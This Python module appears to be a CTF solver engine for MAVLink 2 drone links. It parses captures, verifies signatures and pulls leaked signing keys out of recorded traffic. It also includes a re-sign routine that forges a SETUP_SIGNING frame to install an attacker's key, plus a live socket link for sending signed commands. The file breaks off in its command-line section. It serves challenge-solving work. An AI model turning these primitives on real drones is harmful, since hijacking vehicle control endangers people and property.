#!/usr/bin/env python3
"""MAVLink 2 parse / sign / live-link engine, with a provisioning re-sign primitive (B-031).

MAVLink 2 is the drone command-and-telemetry wire protocol.  Several network challenges hand over a
signed MAVLink 2 recording (a ``.pcap`` or a ``.tlog``) plus a live uplink, and the break is always
one of two shapes:

  * an in-band **key leak** -- the operator pushed a ``SETUP_SIGNING`` (msgid 256) over the recorded
    link, so the 32-byte signing secret is sitting in the capture (csctf 9127 "Severed Link"); or
  * a **provisioning re-sign** -- ``SETUP_SIGNING`` is authenticated by a per-unit *provisioning*
    key (not the live session key), so you derive that key from a note/banner, install your own
    signing key, then command normally (csctf 9147 "grid-watch").

This module is the reusable engine for both.  It is payload-agnostic at the core (you pass raw
message payloads) with named builders for the messages these challenges use.

What it does, with no network and no challenge binary ever executed:

  * ``parse_stream`` / ``parse_tlog`` / ``parse_pcap`` -- dissect signed MAVLink 2 frames from a raw
    byte stream, a ``.tlog`` (8-byte big-endian wall-clock-us record header + one frame), or a
    classic ``.pcap`` (Ethernet/IPv4/UDP or TCP).
  * ``x25_crc`` + ``crc_extra_from_def`` -- the X.25 / MCRF4XX checksum and the per-message
    ``CRC_EXTRA`` byte, *computed* from a message definition (not only a hard-coded table), so new
    messages can be added without magic numbers.
  * ``extract_setup_signing`` -- pull every leaked signing secret out of a capture.
  * ``sign_frame`` / ``build_signed`` / ``verify_signature`` / ``which_key`` -- the MAVLink 2
    signature ``sha256(key || frame || link_id || ts6)[:6]`` with advancing 48-bit timestamps.
  * ``hkdf_sha256`` / ``derive_prov_key`` / ``resign_setup_signing`` -- the provisioning re-sign
    primitive.
  * ``LiveLink`` -- send signed commands over a socket, reading the unit's current RTC off incoming
    signed telemetry so forged timestamps stay monotonic and in-window.  Scope-guarded through
    ``ctf.scope`` (loopback is always allowed for a local fake).

Entry ``solve(challenge_dir, profile) -> SolverResult`` dissects a handout's captures at intake and
surfaces leaked keys as evidence; the live flag is recovered by the operator driving ``LiveLink``.
"""
from __future__ import annotations

import hashlib
import hmac
import socket
import struct
import sys
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Iterable, Sequence

# ----------------------------------------------------------------------------- constants
MAGIC_V2 = 0xFD                 # MAVLink 2 start-of-frame
MAGIC_V1 = 0xFE                 # MAVLink 1 start-of-frame (parsed enough to resync past)
INCOMPAT_SIGNED = 0x01          # incompat_flags bit 0: the frame carries a signature trailer
HEADER_LEN = 10                 # magic, len, incompat, compat, seq, sysid, compid, msgid(3)
CRC_LEN = 2
SIG_LEN = 13                    # link_id(1) + timestamp(6) + signature(6)
SIG_SECRET_LEN = 32
MAV_EPOCH = 1420070400          # 2015-01-01T00:00:00Z: signing-timestamp epoch, in 10us ticks
TS_TICK = 1e-5                  # one signing-timestamp tick = 10 microseconds
TS_MASK = (1 << 48) - 1         # the timestamp is 48 bits

SETUP_SIGNING = 256             # msgid of SETUP_SIGNING

# CRC_EXTRA for the messages these challenges touch.  Not a closed world: crc_extra_from_def()
# computes the byte for any message, and MESSAGE_DEFS below is the data it is computed from, which is
# what this table is checked against at test time.
CRC_EXTRA: dict[int, int] = {
    0: 50,    # HEARTBEAT
    1: 124,   # SYS_STATUS
    11: 89,   # SET_MODE
    33: 104,  # GLOBAL_POSITION_INT
    75: 158,  # COMMAND_INT
    76: 152,  # COMMAND_LONG
    77: 143,  # COMMAND_ACK
    253: 83,  # STATUSTEXT
    256: 71,  # SETUP_SIGNING
}


class MavlinkError(ValueError):
    """A malformed frame, an unknown message, or a signing input error."""


# ----------------------------------------------------------------------------- CRC (X.25 / MCRF4XX)
def x25_crc(data: bytes) -> int:
    """The MAVLink X.25 / MCRF4XX CRC-16 over ``data`` (seed 0xFFFF)."""
    crc = 0xFFFF
    for b in data:
        tmp = b ^ (crc & 0xFF)
        tmp = (tmp ^ (tmp << 4)) & 0xFF
        crc = ((crc >> 8) ^ (tmp << 8) ^ (tmp << 3) ^ (tmp >> 4)) & 0xFFFF
    return crc


def _x25_acc(crc: int, data: bytes) -> int:
    """Accumulate ``data`` into a running X.25 CRC (seed the caller supplies)."""
    for b in data:
        tmp = b ^ (crc & 0xFF)
        tmp = (tmp ^ (tmp << 4)) & 0xFF
        crc = ((crc >> 8) ^ (tmp << 8) ^ (tmp << 3) ^ (tmp >> 4)) & 0xFFFF
    return crc


# Base wire size of each MAVLink field type, used both to order fields on the wire and to compute
# CRC_EXTRA (fields are laid out largest-type-first, XML order breaking ties).
_TYPE_SIZE = {
    "char": 1, "uint8_t": 1, "int8_t": 1, "uint8_t_mavlink_version": 1,
    "uint16_t": 2, "int16_t": 2,
    "uint32_t": 4, "int32_t": 4, "float": 4,
    "uint64_t": 8, "int64_t": 8, "double": 8,
}

# The crc_extra algorithm names the base C type; this maps the quirky one back.
_CRC_TYPE_NAME = {"uint8_t_mavlink_version": "uint8_t"}


@dataclass(frozen=True)
class MsgField:
    """One message field: wire type, name, and array length (``None`` for a scalar)."""
    type: str
    name: str
    array: int | None = None

    @property
    def size(self) -> int:
        base = _TYPE_SIZE[self.type]
        return base * (self.array or 1)


# Message definitions (MAVLink common.xml), in XML field order.  The source of truth the CRC_EXTRA
# table is checked against, and what the payload builders below pack.
MESSAGE_DEFS: dict[int, tuple[str, tuple[MsgField, ...]]] = {
    0: ("HEARTBEAT", (
        MsgField("uint8_t", "type"), MsgField("uint8_t", "autopilot"),
        MsgField("uint8_t", "base_mode"), MsgField("uint32_t", "custom_mode"),
        MsgField("uint8_t", "system_status"), MsgField("uint8_t_mavlink_version", "mavlink_version"))),
    1: ("SYS_STATUS", (
        MsgField("uint32_t", "onboard_control_sensors_present"),
        MsgField("uint32_t", "onboard_control_sensors_enabled"),
        MsgField("uint32_t", "onboard_control_sensors_health"),
        MsgField("uint16_t", "load"), MsgField("uint16_t", "voltage_battery"),
        MsgField("int16_t", "current_battery"), MsgField("uint16_t", "drop_rate_comm"),
        MsgField("uint16_t", "errors_comm"), MsgField("uint16_t", "errors_count1"),
        MsgField("uint16_t", "errors_count2"), MsgField("uint16_t", "errors_count3"),
        MsgField("uint16_t", "errors_count4"), MsgField("int8_t", "battery_remaining"))),
    11: ("SET_MODE", (
        MsgField("uint32_t", "custom_mode"), MsgField("uint8_t", "target_system"),
        MsgField("uint8_t", "base_mode"))),
    33: ("GLOBAL_POSITION_INT", (
        MsgField("uint32_t", "time_boot_ms"), MsgField("int32_t", "lat"), MsgField("int32_t", "lon"),
        MsgField("int32_t", "alt"), MsgField("int32_t", "relative_alt"), MsgField("int16_t", "vx"),
        MsgField("int16_t", "vy"), MsgField("int16_t", "vz"), MsgField("uint16_t", "hdg"))),
    75: ("COMMAND_INT", (
        MsgField("uint8_t", "target_system"), MsgField("uint8_t", "target_component"),
        MsgField("uint8_t", "frame"), MsgField("uint16_t", "command"), MsgField("uint8_t", "current"),
        MsgField("uint8_t", "autocontinue"), MsgField("float", "param1"), MsgField("float", "param2"),
        MsgField("float", "param3"), MsgField("float", "param4"), MsgField("int32_t", "x"),
        MsgField("int32_t", "y"), MsgField("float", "z"))),
    76: ("COMMAND_LONG", (
        MsgField("uint8_t", "target_system"), MsgField("uint8_t", "target_component"),
        MsgField("uint16_t", "command"), MsgField("uint8_t", "confirmation"),
        MsgField("float", "param1"), MsgField("float", "param2"), MsgField("float", "param3"),
        MsgField("float", "param4"), MsgField("float", "param5"), MsgField("float", "param6"),
        MsgField("float", "param7"))),
    77: ("COMMAND_ACK", (
        MsgField("uint16_t", "command"), MsgField("uint8_t", "result"))),
    253: ("STATUSTEXT", (
        MsgField("uint8_t", "severity"), MsgField("char", "text", 50))),
    256: ("SETUP_SIGNING", (
        MsgField("uint8_t", "target_system"), MsgField("uint8_t", "target_component"),
        MsgField("uint8_t", "secret_key", 32), MsgField("uint64_t", "initial_timestamp"))),
}


def _wire_order(fields: Sequence[MsgField]) -> list[MsgField]:
    """Fields in MAVLink wire order: by descending base-type size, stable on XML order."""
    return sorted(fields, key=lambda f: -_TYPE_SIZE[f.type])


def crc_extra_from_def(name: str, fields: Sequence[MsgField]) -> int:
    """Compute a message's ``CRC_EXTRA`` byte from its name and fields (the pymavlink algorithm)."""
    crc = x25_crc((name + " ").encode())
    for f in _wire_order(fields):
        tname = _CRC_TYPE_NAME.get(f.type, f.type)
        crc = _x25_acc(crc, (tname + " ").encode())
        crc = _x25_acc(crc, (f.name + " ").encode())
        if f.array is not None:
            crc = _x25_acc(crc, bytes([f.array]))
    return (crc & 0xFF) ^ (crc >> 8)


def crc_extra(msgid: int) -> int:
    """The ``CRC_EXTRA`` for a known msgid; raises ``MavlinkError`` for an unknown one (no guessing)."""
    if msgid in CRC_EXTRA:
        return CRC_EXTRA[msgid]
    if msgid in MESSAGE_DEFS:
        return crc_extra_from_def(*MESSAGE_DEFS[msgid])
    raise MavlinkError(
        f"no CRC_EXTRA for msgid {msgid}: add it to MESSAGE_DEFS or pass crc_extra= explicitly")


# ----------------------------------------------------------------------------- framing / parsing
def _trim(payload: bytes) -> bytes:
    """MAVLink 2 payload truncation: drop trailing zero bytes, keeping at least one."""
    p = payload.rstrip(b"\x00")
    return p or b"\x00"


@dataclass(frozen=True)
class Frame:
    """One parsed MAVLink 2 frame."""
    msgid: int
    payload: bytes                 # on-the-wire (truncated) payload
    seq: int
    sysid: int
    compid: int
    incompat: int
    compat: int
    crc: int
    raw: bytes                     # full frame bytes including any signature trailer
    signed: bool = False
    link_id: int | None = None
    timestamp: int | None = None   # 48-bit signing timestamp
    signature: bytes | None = None

    @property
    def body_no_sig(self) -> bytes:
        """The frame bytes the signature is computed over: magic .. end of CRC."""
        end = HEADER_LEN + len(self.payload) + CRC_LEN
        return self.raw[:end]

    def crc_ok(self, extra: int | None = None) -> bool:
        """True when the frame's CRC matches (using CRC_EXTRA for its msgid unless ``extra`` given)."""
        try:
            x = crc_extra(self.msgid) if extra is None else extra
        except MavlinkError:
            return False
        want = x25_crc(self.raw[1:HEADER_LEN + len(self.payload)] + bytes([x]))
        return want == self.crc


def _parse_one(buf: bytes, i: int) -> tuple[Frame | None, int]:
    """Parse one v2 frame at ``buf[i]`` (buf[i] == MAGIC_V2). Return (frame|None, next_index).

    ``None`` with next_index == i means "not enough bytes yet"; a returned frame's next_index is the
    index just past it.
    """
    if i + HEADER_LEN > len(buf):
        return None, i
    ln = buf[i + 1]
    incompat = buf[i + 2]
    compat = buf[i + 3]
    seq = buf[i + 4]
    sysid = buf[i + 5]
    compid = buf[i + 6]
    msgid = buf[i + 7] | (buf[i + 8] << 8) | (buf[i + 9] << 16)
    signed = bool(incompat & INCOMPAT_SIGNED)
    end = i + HEADER_LEN + ln + CRC_LEN + (SIG_LEN if signed else 0)
    if end > len(buf):
        return None, i
    payload = bytes(buf[i + HEADER_LEN:i + HEADER_LEN + ln])
    crc = int.from_bytes(buf[i + HEADER_LEN + ln:i + HEADER_LEN + ln + CRC_LEN], "little")
    link_id = ts = sig = None
    if signed:
        t = i + HEADER_LEN + ln + CRC_LEN
        link_id = buf[t]
        ts = int.from_bytes(buf[t + 1:t + 7], "little")
        sig = bytes(buf[t + 7:t + 13])
    frame = Frame(msgid=msgid, payload=payload, seq=seq, sysid=sysid, compid=compid,
                  incompat=incompat, compat=compat, crc=crc, raw=bytes(buf[i:end]),
                  signed=signed, link_id=link_id, timestamp=ts, signature=sig)
    return frame, end


def parse_stream(buf: bytes, *, require_crc: bool = False) -> tuple[list[Frame], bytes]:
    """Parse MAVLink 2 frames from a raw byte stream.

    Returns ``(frames, leftover)`` where ``leftover`` is the unparsed tail (a partial frame).  Bytes
    that are not a MAVLink 2 frame start (including v1 0xFE frames) are skipped by resync.  With
    ``require_crc`` only frames whose CRC validates are returned (used to reject false 0xFD syncs).
    """
    frames: list[Frame] = []
    i = 0
    n = len(buf)
    while i < n:
        b = buf[i]
        if b == MAGIC_V2:
            frame, nxt = _parse_one(buf, i)
            if frame is None and nxt == i:
                break  # need more bytes
            if frame is not None and (not require_crc or frame.crc_ok()):
                frames.append(frame)
                i = nxt
                continue
            # a false 0xFD sync (or require_crc miss): resync one byte on
            i += 1
            continue
        if b == MAGIC_V1:
            if i + 8 > n:
                break
            ln = buf[i + 1]
            end = i + 8 + ln  # v1 header(6) + payload + crc(2)
            if end > n:
                break
            i = end  # skip the v1 frame; this engine dissects v2
            continue
        i += 1
    return frames, buf[i:]


def parse_tlog(data: bytes) -> list[tuple[int, Frame]]:
    """Parse a ``.tlog``: repeated [8-byte big-endian wall-clock-us timestamp][one MAVLink frame]."""
    out: list[tuple[int, Frame]] = []
    i = 0
    n = len(data)
    while i + 8 <= n:
        ts_us = int.from_bytes(data[i:i + 8], "big")
        j = i + 8
        if j >= n or data[j] != MAGIC_V2:
            # Not a v2 frame where we expect one: resync to the next 0xFD boundary.
            k = data.find(bytes([MAGIC_V2]), j)
            if k < 0:
                break
            i = max(k - 8, j)
            continue
        frame, nxt = _parse_one(data, j)
        if frame is None:
            break
        out.append((ts_us, frame))
        i = nxt
    return out


# ----------------------------------------------------------------------------- pcap
def _iter_pcap_packets(data: bytes) -> Iterable[tuple[float, bytes, int]]:
    """Yield (ts_seconds, link-layer-bytes, linktype) from a classic libpcap file."""
    if len(data) < 24:
        raise MavlinkError("pcap too short for a global header")
    magic = data[:4]
    if magic in (b"\xa1\xb2\xc3\xd4", b"\xa1\xb2\x3c\x4d"):
        endian = ">"
    elif magic in (b"\xd4\xc3\xb2\xa1", b"\x4d\x3c\xb2\xa1"):
        endian = "<"
    else:
        raise MavlinkError(f"not a libpcap file (magic {magic.hex()})")
    nano = magic in (b"\xa1\xb2\x3c\x4d", b"\x4d\x3c\xb2\xa1")
    linktype = struct.unpack(endian + "I", data[20:24])[0]
    i = 24
    n = len(data)
    while i + 16 <= n:
        ts_sec, ts_frac, incl, orig = struct.unpack(endian + "IIII", data[i:i + 16])
        i += 16
        if i + incl > n:
            break
        pkt = data[i:i + incl]
        i += incl
        ts = ts_sec + ts_frac / (1e9 if nano else 1e6)
        yield ts, pkt, linktype


def _transport_payload(link_bytes: bytes, linktype: int) -> bytes | None:
    """Strip the link / IP / transport headers, returning the UDP or TCP payload (or None)."""
    p = link_bytes
    if linktype == 1:                 # DLT_EN10MB (Ethernet II)
        if len(p) < 14:
            return None
        ethertype = int.from_bytes(p[12:14], "big")
        off = 14
        while ethertype == 0x8100 and len(p) >= off + 4:   # 802.1Q VLAN tag
            ethertype = int.from_bytes(p[off + 2:off + 4], "big")
            off += 4
        if ethertype != 0x0800:       # only IPv4
            return None
        p = p[off:]
    elif linktype == 101:             # DLT_RAW: starts at the IP header
        pass
    elif linktype in (0, 108):        # DLT_NULL / DLT_LOOP: 4-byte address family
        if len(p) < 4:
            return None
        p = p[4:]
    else:
        return None
    if len(p) < 20 or (p[0] >> 4) != 4:
        return None
    ihl = (p[0] & 0x0F) * 4
    proto = p[9]
    if len(p) < ihl:
        return None
    ip_payload = p[ihl:]
    if proto == 17:                   # UDP
        if len(ip_payload) < 8:
            return None
        return ip_payload[8:]
    if proto == 6:                    # TCP
        if len(ip_payload) < 20:
            return None
        data_off = (ip_payload[12] >> 4) * 4
        if len(ip_payload) < data_off:
            return None
        return ip_payload[data_off:]
    return None


def parse_pcap(data: bytes) -> list[tuple[float, Frame]]:
    """Parse MAVLink 2 frames out of a classic ``.pcap`` (Ethernet/IPv4 + UDP or TCP)."""
    out: list[tuple[float, Frame]] = []
    for ts, pkt, linktype in _iter_pcap_packets(data):
        payload = _transport_payload(pkt, linktype)
        if not payload:
            continue
        frames, _ = parse_stream(payload, require_crc=True)
        for f in frames:
            out.append((ts, f))
    return out


def parse_capture(path: str | Path, data: bytes | None = None) -> list[tuple[float, Frame]]:
    """Dissect a capture by extension: ``.pcap``→pcap, ``.tlog``→tlog (us→s), else a raw stream."""
    path = Path(path)
    if data is None:
        data = path.read_bytes()
    suf = path.suffix.lower()
    if suf in (".pcap", ".pcapng", ".cap"):
        return parse_pcap(data)
    if suf in (".tlog", ".log"):
        return [(ts / 1e6, f) for ts, f in parse_tlog(data)]
    frames, _ = parse_stream(data, require_crc=True)
    return [(0.0, f) for f in frames]


# ----------------------------------------------------------------------------- signing
def mav_timestamp(when: float | None = None, *, epoch: int = MAV_EPOCH) -> int:
    """The 48-bit MAVLink signing timestamp (10us ticks since ``epoch``) for a wall-clock time."""
    t = time.time() if when is None else when
    return int((t - epoch) / TS_TICK) & TS_MASK


def sign_frame(key: bytes, body_no_sig: bytes, link_id: int, timestamp: int) -> bytes:
    """The 6-byte MAVLink 2 signature ``sha256(key || frame || link_id || ts6)[:6]``."""
    if len(key) != SIG_SECRET_LEN:
        raise MavlinkError(f"signing key must be {SIG_SECRET_LEN} bytes, got {len(key)}")
    ts6 = (timestamp & TS_MASK).to_bytes(6, "little")
    return hashlib.sha256(key + body_no_sig + bytes([link_id & 0xFF]) + ts6).digest()[:6]


def build_frame(msgid: int, payload: bytes, *, seq: int = 0, sysid: int = 255, compid: int = 190,
                key: bytes | None = None, link_id: int = 0, timestamp: int | None = None,
                extra: int | None = None) -> bytes:
    """Build a MAVLink 2 frame; signed when ``key`` is given (incompat bit 0 set, trailer appended)."""
    p = _trim(payload)
    incompat = INCOMPAT_SIGNED if key is not None else 0x00
    header = bytes([MAGIC_V2, len(p), incompat, 0x00, seq & 0xFF, sysid & 0xFF, compid & 0xFF]) \
        + (msgid & 0xFFFFFF).to_bytes(3, "little")
    x = crc_extra(msgid) if extra is None else extra
    crc = x25_crc(header[1:] + p + bytes([x]))
    body = header + p + struct.pack("<H", crc)
    if key is None:
        return body
    ts = mav_timestamp() if timestamp is None else timestamp
    ts6 = (ts & TS_MASK).to_bytes(6, "little")
    sig = sign_frame(key, body, link_id, ts)
    return body + bytes([link_id & 0xFF]) + ts6 + sig


def build_signed(msgid, payload, key, **kw) -> bytes:
    """``build_frame`` with a required signing key (reads as intent at a call site)."""
    if key is None:
        raise MavlinkError("build_signed needs a key; use build_frame for an unsigned frame")
    return build_frame(msgid, payload, key=key, **kw)


def verify_signature(frame: Frame, key: bytes) -> bool:
    """True when ``frame`` is signed and its signature matches ``key``."""
    if not frame.signed or frame.signature is None or frame.timestamp is None \
            or frame.link_id is None:
        return False
    want = sign_frame(key, frame.body_no_sig, frame.link_id, frame.timestamp)
    return hmac.compare_digest(want, frame.signature)


def which_key(frames: Iterable[Frame], candidates: Iterable[bytes]) -> bytes | None:
    """Return the first candidate key that verifies at least one signed frame, else ``None``."""
    cand = list(candidates)
    for f in frames:
        if not f.signed:
            continue
        for k in cand:
            if verify_signature(f, k):
                return k
    return None


# ----------------------------------------------------------------------------- SETUP_SIGNING
@dataclass(frozen=True)
class SigningSetup:
    """A recovered SETUP_SIGNING: the leaked signing secret and who it targets."""
    target_system: int
    target_component: int
    initial_timestamp: int
    secret_key: bytes

    @property
    def key_hex(self) -> str:
        return self.secret_key.hex()


def decode_setup_signing(payload: bytes) -> SigningSetup:
    """Decode a SETUP_SIGNING (msgid 256) payload (zero-padded to full length if truncated)."""
    full = payload + bytes(42 - len(payload)) if len(payload) < 42 else payload
    initial_ts = int.from_bytes(full[0:8], "little")
    target_sys = full[8]
    target_comp = full[9]
    secret = bytes(full[10:42])
    return SigningSetup(target_sys, target_comp, initial_ts, secret)


def extract_setup_signing(frames: Iterable[Frame]) -> list[SigningSetup]:
    """Every SETUP_SIGNING secret present in a sequence of frames (the in-band key leak)."""
    out = []
    for f in frames:
        if f.msgid == SETUP_SIGNING:
            out.append(decode_setup_signing(f.payload))
    return out


# ----------------------------------------------------------------------------- provisioning re-sign
def hkdf_sha256(ikm: bytes, salt: bytes, info: bytes, length: int = 32) -> bytes:
    """HKDF-SHA256 (RFC 5869): extract-then-expand, for deriving a per-unit provisioning key."""
    if not salt:
        salt = bytes(hashlib.sha256().digest_size)
    prk = hmac.new(salt, ikm, hashlib.sha256).digest()
    okm, t = b"", b""
    i = 1
    while len(okm) < length:
        t = hmac.new(prk, t + info + bytes([i]), hashlib.sha256).digest()
        okm += t
        i += 1
    return okm[:length]


def derive_prov_key(serial: bytes, epoch: int, nonce: bytes, *, info: bytes,
                    length: int = 32) -> bytes:
    """A provisioning key ``HKDF(ikm=serial||epoch_u64_le, salt=nonce, info=info)``.

    The exact construction is read from a per-challenge note or connect banner; ``info`` and the
    serial/epoch/nonce are the operator's inputs.  Use ``hkdf_sha256`` directly for other shapes.
    """
    ikm = serial + struct.pack("<Q", epoch & 0xFFFFFFFFFFFFFFFF)
    return hkdf_sha256(ikm, nonce, info, length)


def setup_signing_payload(target_sys: int, target_comp: int, secret_key: bytes,
                          initial_timestamp: int) -> bytes:
    """Pack a SETUP_SIGNING payload in wire order (initial_timestamp, target_sys, target_comp, key)."""
    if len(secret_key) != SIG_SECRET_LEN:
        raise MavlinkError(f"secret_key must be {SIG_SECRET_LEN} bytes, got {len(secret_key)}")
    return struct.pack("<Q", initial_timestamp & TS_MASK) \
        + bytes([target_sys & 0xFF, target_comp & 0xFF]) + secret_key


def resign_setup_signing(prov_key: bytes, new_key: bytes, *, target_sys: int = 1, target_comp: int = 1,
                         initial_timestamp: int = 0, seq: int = 0, sysid: int = 255, compid: int = 190,
                         link_id: int = 0, timestamp: int | None = None) -> bytes:
    """Build a SETUP_SIGNING(256) frame signed with ``prov_key`` that installs ``new_key``.

    This is the provisioning re-sign primitive: the unit verifies SETUP_SIGNING against its per-unit
    provisioning key, not the live session key, so a signed install of our own key takes over the link.
    """
    payload = setup_signing_payload(target_sys, target_comp, new_key, initial_timestamp)
    return build_signed(SETUP_SIGNING, payload, prov_key, seq=seq, sysid=sysid, compid=compid,
                        link_id=link_id, timestamp=timestamp)


# ----------------------------------------------------------------------------- message builders
def heartbeat(*, mav_type: int = 6, autopilot: int = 8, base_mode: int = 0, custom_mode: int = 0,
              system_status: int = 4, mavlink_version: int = 3) -> bytes:
    """A HEARTBEAT(0) payload (default: a GCS)."""
    return struct.pack("<IBBBBB", custom_mode, mav_type, autopilot, base_mode, system_status,
                       mavlink_version)


def command_long(command: int, *, target_sys: int = 1, target_comp: int = 1, confirmation: int = 0,
                 params: Sequence[float] = (0.0,) * 7) -> bytes:
    """A COMMAND_LONG(76) payload."""
    pr = list(params) + [0.0] * (7 - len(params))
    return bytes([target_sys & 0xFF, target_comp & 0xFF]) + struct.pack("<H", command & 0xFFFF) \
        + bytes([confirmation & 0xFF]) + struct.pack("<7f", *[float(x) for x in pr[:7]])


def command_int(command: int, *, target_sys: int = 1, target_comp: int = 1, frame: int = 0,
                current: int = 0, autocontinue: int = 0, params: Sequence[float] = (0.0,) * 4,
                x: int = 0, y: int = 0, z: float = 0.0) -> bytes:
    """A COMMAND_INT(75) payload."""
    pr = list(params) + [0.0] * (4 - len(params))
    return bytes([target_sys & 0xFF, target_comp & 0xFF, frame & 0xFF]) \
        + struct.pack("<H", command & 0xFFFF) + bytes([current & 0xFF, autocontinue & 0xFF]) \
        + struct.pack("<4f", *[float(p) for p in pr[:4]]) + struct.pack("<iif", int(x), int(y), float(z))


def set_mode(base_mode: int, custom_mode: int, *, target_sys: int = 1) -> bytes:
    """A SET_MODE(11) payload."""
    return struct.pack("<I", custom_mode & 0xFFFFFFFF) + bytes([target_sys & 0xFF, base_mode & 0xFF])


def statustext_text(frame: Frame) -> str | None:
    """The text of a STATUSTEXT(253) frame (severity byte dropped), else ``None``."""
    if frame.msgid != 253 or len(frame.payload) < 1:
        return None
    return frame.payload[1:].split(b"\x00", 1)[0].decode("latin1")


# ----------------------------------------------------------------------------- live link
_LOOPBACK = {"127.0.0.1", "::1", "localhost", "ip6-localhost"}


def guard_target(host: str, port: int, profile=None) -> str:
    """Scope-check a live target before connecting.  Loopback is always allowed (a local fake).

    With an event profile, a non-loopback host must be inside ``rules.live_service_scope`` (via
    ``ctf.scope``); without one, the operator owns the choice and this is a no-op.
    """
    if host.strip().lower() in _LOOPBACK:
        return host
    if profile is None:
        return host
    from ctf import scope
    scope.check_host(host, port, what=f"mavlink live-link {host}:{port}", profile=profile)
    return host


class LiveLink:
    """A live MAVLink 2 uplink over a socket: send signed commands, read telemetry, stay monotonic.

    Never used against event infrastructure from build work; tests drive it against a loopback fake.
    """

    def __init__(self, sock: socket.socket, *, sysid: int = 255, compid: int = 190, link_id: int = 0):
        self.sock = sock
        self.sysid = sysid
        self.compid = compid
        self.link_id = link_id
        self.seq = 0
        self.last_ts = 0
        self._buf = b""

    @classmethod
    def connect(cls, host: str, port: int, *, profile=None, timeout: float = 10.0, **kw) -> "LiveLink":
        guard_target(host, port, profile)
        sock = socket.create_connection((host, port), timeout=timeout)
        return cls(sock, **kw)

    def close(self) -> None:
        try:
            self.sock.close()
        except OSError:
            pass

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        self.close()

    def next_timestamp(self, *, epoch: int = MAV_EPOCH) -> int:
        """A signing timestamp strictly after any seen on this link and not behind the wall clock."""
        ts = max(self.last_ts + 1, mav_timestamp(epoch=epoch))
        self.last_ts = ts
        return ts

    def send(self, msgid: int, payload: bytes, key: bytes, *, timestamp: int | None = None,
             extra: int | None = None) -> bytes:
        """Build, send and return a signed frame, advancing the sequence and timestamp."""
        ts = self.next_timestamp() if timestamp is None else timestamp
        self.last_ts = max(self.last_ts, ts)
        frame = build_signed(msgid, payload, key, seq=self.seq, sysid=self.sysid, compid=self.compid,
                             link_id=self.link_id, timestamp=ts, extra=extra)
        self.seq = (self.seq + 1) & 0xFF
        self.sock.sendall(frame)
        return frame

    def send_raw(self, frame: bytes) -> None:
        """Send a pre-built frame as-is (e.g. a re-sign frame from ``resign_setup_signing``)."""
        self.sock.sendall(frame)

    def recv_frames(self, *, timeout: float = 2.0, max_seconds: float = 2.0) -> list[Frame]:
        """Read for up to ``max_seconds``, parse frames, and track the unit's latest RTC timestamp."""
        frames: list[Frame] = []
        self.sock.settimeout(timeout)
        end = time.time() + max_seconds
        while time.time() < end:
            try:
                chunk = self.sock.recv(65535)
            except socket.timeout:
                break
            except OSError:
                break
            if not chunk:
                break
            self._buf += chunk
            got, self._buf = parse_stream(self._buf)
            for f in got:
                if f.signed and f.timestamp is not None:
                    self.last_ts = max(self.last_ts, f.timestamp)
            frames.extend(got)
        return frames


# ----------------------------------------------------------------------------- intake dissection
_CAPTURE_SUFFIXES = (".pcap", ".pcapng", ".cap", ".tlog", ".log", ".bin", ".raw", ".dat")


def dissect_dir(challenge_dir: Path) -> dict:
    """Dissect every capture under a challenge dir: frame count, signed count, leaked keys.

    A capture-suffixed file that fails to parse is recorded in ``skipped`` with its named reason, so
    a corrupt ``.tlog``/``.pcap`` is a visible skip rather than a silent drop.
    """
    frames: list[Frame] = []
    files: list[str] = []
    skipped: list[tuple[str, str]] = []
    for p in sorted(challenge_dir.rglob("*")):
        if not p.is_file() or p.suffix.lower() not in _CAPTURE_SUFFIXES:
            continue
        rel = str(p.relative_to(challenge_dir))
        try:
            got = parse_capture(p)
        except (MavlinkError, OSError) as e:
            skipped.append((rel, str(e)))
            continue
        if got:
            files.append(rel)
            frames.extend(f for _, f in got)
    leaks = extract_setup_signing(frames)
    signed = [f for f in frames if f.signed]
    return {"files": files, "frames": frames, "signed": signed, "leaks": leaks, "skipped": skipped}


def solve(challenge_dir, profile=None, **opts):
    """Intake dissection: parse MAVLink captures, surface leaked SETUP_SIGNING keys as evidence.

    No flag is recovered offline (the flag comes from a live command the drone accepts); this returns
    ``unsure`` when it found a signed MAVLink link and/or a leaked key, with the evidence an operator
    then drives through ``LiveLink``, and ``none`` when the handout has no MAVLink.
    """
    from ctf.result import SolverResult, Evidence

    challenge_dir = Path(challenge_dir)
    info = dissect_dir(challenge_dir)
    frames = info["frames"]
    skipped = info.get("skipped", [])
    if not frames:
        note = "no MAVLink 2 frames found in the handout captures"
        if skipped:
            note += "; skipped unparseable capture(s): " \
                + ", ".join(f"{name} ({why})" for name, why in skipped)
        return SolverResult(status="none", engine="toolkits.mavlink_link", notes=note)

    evidence = []
    notes = []
    nsigned = len(info["signed"])
    notes.append(f"{len(frames)} MAVLink 2 frames in {len(info['files'])} capture(s); {nsigned} signed")
    any_verified = False
    for leak in info["leaks"]:
        # Confirm the leaked key actually signs frames on the link before reporting it as the break.
        verified = which_key(frames, [leak.secret_key]) is not None
        any_verified = any_verified or verified
        tag = "verified against signed frames" if verified else "not seen signing frames"
        evidence.append(Evidence(
            kind="wire",
            detail=f"SETUP_SIGNING leak: key {leak.key_hex} (target {leak.target_system}/"
                   f"{leak.target_component}, {tag})"))
        notes.append(f"leaked signing key {leak.key_hex} ({tag})")
    if any_verified:
        # A leaked key that verifies against the captured signed frames is a strong, high-confidence
        # break signal: an operator can drive it straight through LiveLink. (No offline flag exists,
        # so the status stays 'unsure', but the signal is called out rather than buried.)
        notes.append("STRONG SIGNAL: a leaked key verifies against the signed link -- drive it live")

    if not info["leaks"]:
        # Signed link but no in-band key: this is the provisioning-re-sign shape.
        for f in info["signed"][:1]:
            evidence.append(Evidence(
                kind="wire",
                detail=f"signed MAVLink 2 link (sysid {f.sysid}, link_id {f.link_id}); no in-band "
                       f"SETUP_SIGNING -- needs a provisioning-key re-sign"))
        if nsigned:
            notes.append("no in-band key leak; derive the provisioning key and re-sign (CLI resign)")

    if skipped:
        notes.append("skipped unparseable capture(s): "
                     + ", ".join(f"{name} ({why})" for name, why in skipped))

    return SolverResult(status="unsure", engine="toolkits.mavlink_link",
                        evidence=tuple(evidence), notes="; ".join(notes))


# ----------------------------------------------------------------------------- module CLI (dissect)
def _main(argv: list[str]) -> int:
    import argparse
    ap = argparse.ArgumentParser(prog="mavlink_link", description="dissect a MAVLink 2 capture")
    ap.add_argument("capture", help="a .pcap / .tlog / raw MAVLink stream")
    ap.add_argument("--key", help="verify signatures against this 64-hex-char signing key")
    args = ap.parse_args(argv)
    try:
